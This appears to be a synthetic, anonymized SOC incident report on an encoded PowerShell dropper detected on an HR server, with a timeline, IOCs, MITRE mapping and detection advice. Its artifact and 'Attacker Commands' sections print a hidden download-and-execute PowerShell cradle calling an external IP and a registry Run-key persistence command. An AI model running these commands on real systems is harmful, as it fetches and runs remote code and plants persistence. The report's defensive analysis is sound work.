ğŸ›¡ Suspicious PowerShell in HR Server (Anonymized)

ğŸ“Œ Executive Summary

During routine SOC monitoring, a suspicious PowerShell command was detected on an internal HR application server.
The command attempted to download a remote script from a non-whitelisted domain.
Persistence was deployed via a registry Run Key, but no lateral movement was observed.

ğŸ¯ Outcome: early detection and containment prevented potential ransomware execution.

_______________________________________________________________________________________________________________________________________________

ğŸ–¼ Attack Flow (ASCII Diagram)


+--------------------------+
| SOC Alert: PowerShell    |
| (Encoded Command)        |
+--------------------------+
             |
             v
+--------------------------+
| Download from External   |
| IP via Invoke-WebRequest |
+--------------------------+
             |
             v
+--------------------------+
| Dropper Saved in Temp    |
| Folder                   |
+--------------------------+
             |
             v
+--------------------------+
| Persistence via Run Key  |
+--------------------------+
             |
             v
+--------------------------+
| Contained & Removed      |
+--------------------------+

_______________________________________________________________________________________________________________________________________________

ğŸ“– Attack Narrative


ğŸ¥· Stage 1 â€“ Execution

EDR flagged suspicious base64-encoded PowerShell on HR server.

Command invoked Invoke-WebRequest targeting a suspicious IP.


ğŸŒ Stage 2 â€“ Delivery Attempt

Payload attempted to save dropper into %TEMP%\updater.ps1.

Outbound request blocked by proxy (TI-flagged ASN).


ğŸ›  Stage 3 â€“ Persistence

Registry Run Key created: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater.


ğŸ›¡ Stage 4 â€“ Containment

File quarantined, endpoint isolated.

Run Key deleted. Server returned to production after IR validation.

_______________________________________________________________________________________________________________________________________________

â± Timeline (UTC)

| Time  | Event                                                   |
| ----- | ------------------------------------------------------- |
| 09:11 | ğŸš¨ EDR flagged suspicious encoded PowerShell            |
| 09:13 | ğŸŒ Outbound connection attempt detected (Invoke-WebReq) |
| 09:20 | ğŸ›‘ Dropper quarantined; server isolated                 |
| 10:05 | ğŸ§¹ Persistence (Run Key) cleaned                        |
| 11:00 | âœ… Server returned to production                        |

_______________________________________________________________________________________________________________________________________________

ğŸ“‚ Artifacts (Synthetic / Anonymized)


EDR Detection Log:

{
  "time": "2025-06-04T09:11:04Z",
  "host": "HR-SRV01",
  "process": "powershell.exe",
  "commandLine": "powershell.exe -enc SQBtAHYAbwBrAGUALQBXAGUAYgBSAGUA...==",
  "user": "svc-hrapp",
  "action": "alert"
}

Decoded PowerShell Command:

powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://185.203.114.55/updater.ps1')"

Proxy Log (Blocked):

{
  "time": "2025-06-04T09:13:22Z",
  "srcHost": "HR-SRV01",
  "dstIP": "185.203.114.55",
  "url": "http://185.203.114.55/updater.ps1",
  "action": "BLOCK",
  "reason": "Threat Intel Malicious ASN"
}


Registry Persistence (Run Key):

HKCU\Software\Microsoft\Windows\CurrentVersion\Run
   Updater   REG_SZ   powershell.exe -ExecutionPolicy Bypass -File %TEMP%\updater.ps1

_______________________________________________________________________________________________________________________________________________

ğŸ’» Attacker Commands (Reconstructed, Synthetic)


# Encoded PowerShell payload
powershell.exe -enc SQBtAHYAbwBrAGUALQBXAGUAYgBSAGUA...==

# Decoded behavior
Invoke-WebRequest -Uri "http://185.203.114.55/updater.ps1" -OutFile "$env:TEMP\updater.ps1"
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $env:TEMP\updater.ps1"

# Persistence
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File %TEMP%\updater.ps1"

_______________________________________________________________________________________________________________________________________________

ğŸ§¾ IOCs (Synthetic)


| Type       | Value                                                      | Source            | Status      |
| ---------- | ---------------------------------------------------------- | ----------------- | ----------- |
| ğŸŒ IP      | 185.203.114.55                                             | Proxy logs        | Malicious   |
| ğŸ“ File    | updater.ps1 (SHA256: e3b2c44298fcâ€¦)                        | Sandbox           | Malicious   |
| ğŸ”‘ RunKey  | HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater | Registry snapshot | Persistence |
| ğŸ‘¤ Account | svc-hrapp                                                  | EDR logs          | Abused      |

_______________________________________________________________________________________________________________________________________________

ğŸ”‘ Key Findings


ğŸš¨ Base64-encoded PowerShell flagged by EDR.

ğŸŒ Outbound attempt to malicious IP (blocked).

ğŸ›  Run Key persistence mechanism created.

âœ… No lateral movement observed.

_______________________________________________________________________________________________________________________________________________

ğŸ—‚ï¸ MITRE ATT&CK Mapping


T1059.001 â€“ PowerShell

T1105 â€“ Ingress Tool Transfer (Invoke-WebRequest)

T1547 â€“ Boot or Logon Autostart Execution (Registry Run Key)

_______________________________________________________________________________________________________________________________________________

ğŸ‘€ Detection Use Cases


ğŸš¨ Alert on powershell.exe -enc with long base64 strings.

ğŸš¨ Monitor outbound Invoke-WebRequest to non-whitelisted IPs.

ğŸ›  Detect Run Key modifications in registry.

_______________________________________________________________________________________________________________________________________________

ğŸ›¡ï¸ Response Actions


âŒ Quarantined malicious script & removed persistence.

ğŸ”’ Blocked external IP across perimeter.

ğŸ“‘ IOC shared with TI platform.

ğŸ“š Educated system owners about secure PowerShell usage.

_______________________________________________________________________________________________________________________________________________

ğŸ›¡ï¸ Recommendations


ğŸ” Block outbound traffic to untrusted IPs/domains.

ğŸš¨ Increase monitoring of PowerShell with base64 arguments.

ğŸ›¡ Enforce AppLocker/ASR rules to restrict script execution.

ğŸ§¹ Regular auditing of autorun registry keys.
